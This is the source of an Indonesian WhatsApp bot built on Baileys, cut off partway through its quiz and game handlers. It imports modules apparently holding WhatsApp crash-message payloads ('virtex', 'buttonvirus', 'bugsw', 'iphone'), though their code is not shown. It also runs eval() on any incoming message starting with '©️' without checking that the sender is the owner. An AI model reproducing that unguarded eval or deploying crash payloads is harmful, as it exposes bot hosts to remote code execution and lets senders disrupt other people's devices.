/*
// Buat Lu Yang Jual Sc Ini Yang Jujur Jangan Sampe Nipu 
   Apalagi Lari Dari Tanggung Jawab

// Base ZENN MODS WA

› Create By ZENN MODS WA
› Base Ori ZENN MODS WA - ZENN MODS WA

🌷 KALAU MAU RENAME TARO CREDITS GUA : ZENN MODS WA*/

//=================================================//
require('./hwkal')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const fsx = require('fs-extra')
const axios = require('axios')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const maker = require('mumaker')
const textpro = require('./baseikal/lib/textpro')
const { JSDOM } = require('jsdom')
const mathjs = require('mathjs')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { apikey } = require('./config.json')
const { uptotelegra } = require('./baseikal/lib/upload')
const { color, bgcolor } = require('./baseikal/lib/color')
const { Configuration, OpenAIApi } = require('openai') //install modul npm i openai
const { exec, spawn, execSync } = require("child_process")
const { virtex, vipi } = require('./baseikal/virtex/virtex.js')
const { ngazap } = require('./baseikal/virtex/ngazap')
const { buttonvirus } = require('./baseikal/virtex/buttonvirus')
const { buttonkal } = require('./baseikal/virtex/buttonkal')
const { bugsw } = require('./baseikal/virtex/bugsw')
const { iphone } = require('./baseikal/virtex/iphone')
const { iphone1 } = require('./baseikal/virtex/iphone1')
const { iphone2 } = require('./baseikal/virtex/iphone2')
const { iphone3 } = require('./baseikal/virtex/iphone3')
const { iphone4 } = require('./baseikal/virtex/iphone4')
const { iphone5 } = require('./baseikal/virtex/iphone5')
const { iphone6 } = require('./baseikal/virtex/iphone6')
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./baseikal/lib/uploader')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./baseikal/lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
//=================================================//
// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []
//=================================================//

// COMMAND GUA SULITIN
const thumbnail = fs.readFileSync ('./baseikal/image/mamak.jpg')
const kalimage = fs.readFileSync ('./baseikal/image/mamak.jpg')
const gopay = fs.readFileSync ('./baseikal/image/gopay.jpg')
const dana = fs.readFileSync ('./baseikal/image/dana.jpg')
const rekening = fs.readFileSync ('./baseikal/image/rekening.jpg')
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
const owner = JSON.parse(fs.readFileSync('./premium.json'))
const ntilink = JSON.parse(fs.readFileSync("./baseikal/lib/antilink.json"))
const banned = JSON.parse(fs.readFileSync('./baseikal/dbnye/banned.json'))
virgam = fs.readFileSync(`./baseikal/image/deden.jpeg`)
//=================================================//
module.exports = haikal = async (haikal, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix

//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await haikal.decodeJid(haikal.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const isBan = banned.includes(m.sender)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await haikal.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const welcm = m.isGroup ? wlcm.includes(from) : false
const welcmm = m.isGroup ? wlcmm.includes(from) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"
let full_args = body.replace(command, '').slice(1).trim()
//=================================================//}

const kalgans = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},

'message': {
 "stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
        'isAnimated': []
}}}
const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}
const reply = (teks) => {
return haikal.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `DEVELOPER ZENN MODS WA`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/7b3c0ac03dab420c5c12b.jpg',"thumbnail": thumb,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted : hw})} 

function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
//=================================================//
if (!haikal.public) {
if (!m.key.fromMe) return
}
let rn = ['recording','composing']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
haikal.sendPresenceUpdate(jd, from)
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}

//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: haikal.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, haikal.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
haikal.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('©️')) {
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}
    // RESPON CMD POLL MESSAGE
async function getMessage(key){
if (store) {
const msg = await store.loadMessage(key.remoteJid, key.id)
return msg?.message
}
return {conversation: 'Hw WhatsApp LLc'}
}
haikal.ev.on('messages.update', async(chatUpdate) => {
for (const { key, update } of chatUpdate) {
if (update.pollUpdates && key.fromMe) {
const pollCreation = await getMessage(key)
if (pollCreation) {
const pollUpdate = await getAggregateVotesInPollMessage({
message: pollCreation,
pollUpdates: update.pollUpdates,
})
const command = pollUpdate.filter(v => v.voters.length !== 0)[0]?.name
if (command == undefined) return
const comand = `${command}`
console.log(comand)
haikal.appenTextMessage(comand, chatUpdate)
}
}
}
})
    haikal.sendPoll = (jid, name = '', values = [], selectableCount = 1) => { return haikal.sendMessage(jid, { poll: { name, values, selectableCount }}) }
    

async function sendGeekzMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await haikal.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
let reactionMessage = require("@adiwajshing/baileys").proto.Message.ReactionMessage.create({ key: m.key, text: "" })
//=================================================//
const sendapk = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted : hw})
m.reply('*Rusak Bodoh !! Yang Bener Contoh : Yoapk ZENN MODS WA*')
}
for (let ikalii of apknye) {
if (budy === ikalii) {
let buffer = fs.readFileSync(`./database/apk/${ikalii}.apk`)
sendapk(buffer)
}
}
//=================================================//
const sendzip = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted : hw})
m.reply('*Rusak Bodoh !! Yang Bener Contoh : Yozip ZENN MODS WA*')
}
for (let ikali of zipnye) {
if (budy === ikali) {
let buffer = fs.readFileSync(`./database/zip/${ikali}.zip`)
sendzip(buffer)
}
}
//=================================================//
const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted : hw})
m.reply('*Rusak Bodoh !! Yang Bener Contoh : Yopdf ZENN MODS WA*')
}
for (let ikal of docunye) {
if (budy === ikal) {
let buffer = fs.readFileSync(`./database/Docu/${ikal}.pdf`)
senddocu(buffer)
}
}
const sendvn = (teks) => {
haikal.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, {quoted : hw})
}

for (let anju of vnnye) {
if (budy === anju) {
let buffer = fs.readFileSync(`./database/Audio/${anju}.mp3`)
sendvn(buffer)
}
}
//=================================================//
//LOGO MENTAHAN
const hw1 = fs.readFileSync ('./baseikal/logo/hw1.jpg')
const hw2 = fs.readFileSync ('./baseikal/logo/hw2.jpg')
const hw3 = fs.readFileSync ('./baseikal/logo/hw3.jpg')
const hw4 = fs.readFileSync ('./baseikal/logo/hw4.jpg')
const hw5 = fs.readFileSync ('./baseikal/logo/hw5.jpg')
const hw6 = fs.readFileSync ('./baseikal/logo/hw6.jpg')
const hw7 = fs.readFileSync ('./baseikal/logo/hw7.jpg')
const hw8 = fs.readFileSync ('./baseikal/logo/hw8.jpg')
const hw9 = fs.readFileSync ('./baseikal/logo/hw9.jpg')
const hw10 = fs.readFileSync ('./baseikal/logo/hw10.jpg')
const hw11 = fs.readFileSync ('./baseikal/logo/hw11.jpg')
const hw12 = fs.readFileSync ('./baseikal/logo/hw12.jpg')
const hw13 = fs.readFileSync ('./baseikal/logo/hw13.jpg')
const hw14 = fs.readFileSync ('./baseikal/logo/hw14.jpg')
const hw15 = fs.readFileSync ('./baseikal/logo/hw15.jpg')
const hw16 = fs.readFileSync ('./baseikal/logo/hw16.jpg')
const hw17 = fs.readFileSync ('./baseikal/logo/hw17.jpg')
const hw18 = fs.readFileSync ('./baseikal/logo/hw18.jpg')
const hw19 = fs.readFileSync ('./baseikal/logo/hw19.jpg')
const hw20 = fs.readFileSync ('./baseikal/logo/hw20.jpg')
const hw21 = fs.readFileSync ('./baseikal/logo/hw21.jpg')
const hw22 = fs.readFileSync ('./baseikal/logo/hw22.jpg')
const hw23 = fs.readFileSync ('./baseikal/logo/hw23.jpg')
const hw24 = fs.readFileSync ('./baseikal/logo/hw24.jpg')
const hw25 = fs.readFileSync ('./baseikal/logo/hw25.jpg')
const hw26 = fs.readFileSync ('./baseikal/logo/hw26.jpg')
const hw27 = fs.readFileSync ('./baseikal/logo/hw27.jpg')
const hw28 = fs.readFileSync ('./baseikal/logo/hw28.jpg')
const hw29 = fs.readFileSync ('./baseikal/logo/hw29.jpg')
const hw30 = fs.readFileSync ('./baseikal/logo/hw30.jpg')
const hw31 = fs.readFileSync ('./baseikal/logo/hw31.jpg')
const hw32 = fs.readFileSync ('./baseikal/logo/hw32.jpg')
const hw33 = fs.readFileSync ('./baseikal/logo/hw33.jpg')
const hw34 = fs.readFileSync ('./baseikal/logo/hw34.jpg')
const hw35 = fs.readFileSync ('./baseikal/logo/hw35.jpg')
const hw36 = fs.readFileSync ('./baseikal/logo/hw36.jpg')
const hw37 = fs.readFileSync ('./baseikal/logo/hw37.jpg')
const hw38 = fs.readFileSync ('./baseikal/logo/hw38.jpg')
const hw39 = fs.readFileSync ('./baseikal/logo/hw39.jpg')
const hw40 = fs.readFileSync ('./baseikal/logo/hw40.jpg')
const hw41 = fs.readFileSync ('./baseikal/logo/hw41.jpg')
const hw42 = fs.readFileSync ('./baseikal/logo/hw42.jpg')
const hw43 = fs.readFileSync ('./baseikal/logo/hw43.jpg')
const hw44 = fs.readFileSync ('./baseikal/logo/hw44.jpg')
const hw45 = fs.readFileSync ('./baseikal/logo/hw45.jpg')
const hw46 = fs.readFileSync ('./baseikal/logo/hw46.jpg')
const hw47 = fs.readFileSync ('./baseikal/logo/hw47.jpg')
const hw48 = fs.readFileSync ('./baseikal/logo/hw48.jpg')
const hw49 = fs.readFileSync ('./baseikal/logo/hw49.jpg')
const hw50 = fs.readFileSync ('./baseikal/logo/hw50.jpg')
const hw51 = fs.readFileSync ('./baseikal/logo/hw51.jpg')
const hw52 = fs.readFileSync ('./baseikal/logo/hw52.jpg')
const hw53 = fs.readFileSync ('./baseikal/logo/hw53.jpg')
const hw54 = fs.readFileSync ('./baseikal/logo/hw54.jpg')
const hw55 = fs.readFileSync ('./baseikal/logo/hw55.jpg')
const hw56 = fs.readFileSync ('./baseikal/logo/hw56.jpg')
const hw57 = fs.readFileSync ('./baseikal/logo/hw57.jpg')
const hw58 = fs.readFileSync ('./baseikal/logo/hw58.jpg')
const hw59 = fs.readFileSync ('./baseikal/logo/hw59.jpg')
const hw60 = fs.readFileSync ('./baseikal/logo/hw60.jpg')
const hw61 = fs.readFileSync ('./baseikal/logo/hw61.jpg')
const hw62 = fs.readFileSync ('./baseikal/logo/hw62.jpg')
const hw63 = fs.readFileSync ('./baseikal/logo/hw63.jpg')
const hw64 = fs.readFileSync ('./baseikal/logo/hw64.jpg')
const hw65 = fs.readFileSync ('./baseikal/logo/hw65.jpg')
const hw66 = fs.readFileSync ('./baseikal/logo/hw66.jpg')
const hw67 = fs.readFileSync ('./baseikal/logo/hw67.jpg')
const hw68 = fs.readFileSync ('./baseikal/logo/hw68.jpg')
const hw69 = fs.readFileSync ('./baseikal/logo/hw69.jpg')
const hw70 = fs.readFileSync ('./baseikal/logo/hw70.jpg')
const hw71 = fs.readFileSync ('./baseikal/logo/hw71.jpg')
const hw72 = fs.readFileSync ('./baseikal/logo/hw72.jpg')
const hw73 = fs.readFileSync ('./baseikal/logo/hw73.jpg')
const hw74 = fs.readFileSync ('./baseikal/logo/hw74.jpg')
const hw75 = fs.readFileSync ('./baseikal/logo/hw75.jpg')
const hw76 = fs.readFileSync ('./baseikal/logo/hw76.jpg')
const hw77 = fs.readFileSync ('./baseikal/logo/hw77.jpg')
const hw78 = fs.readFileSync ('./baseikal/logo/hw78.jpg')
const hw79 = fs.readFileSync ('./baseikal/logo/hw79.jpg')
//=================================================//
var createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
try {
ppuser = await haikal.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 
if (('family100'+from in _family100) && isCmd) {
kuis = true
let room = _family100['family100'+from]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
 let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
 if (room.terjawab[index]) return !0
 room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
haikal.sendText(from, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+from].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+from]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted : hw}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
 delete kuismath[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Gambar`}, {quoted : hw})
 delete tebakgambar[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kata`}, {quoted : hw})  
 delete tebakkata[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted : hw}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted : hw}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lirik`}, {quoted : hw}) 
 delete tebaklirik[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted : hw}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = from
if (room.x !== room.o) await haikal.sendText(room.x, str, m, { mentions: parseMention(str) } )
await haikal.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
haikal.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
haikal.sendText(from, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) haikal.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) haikal.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) haikal.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
haikal.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) haikal.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) haikal.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
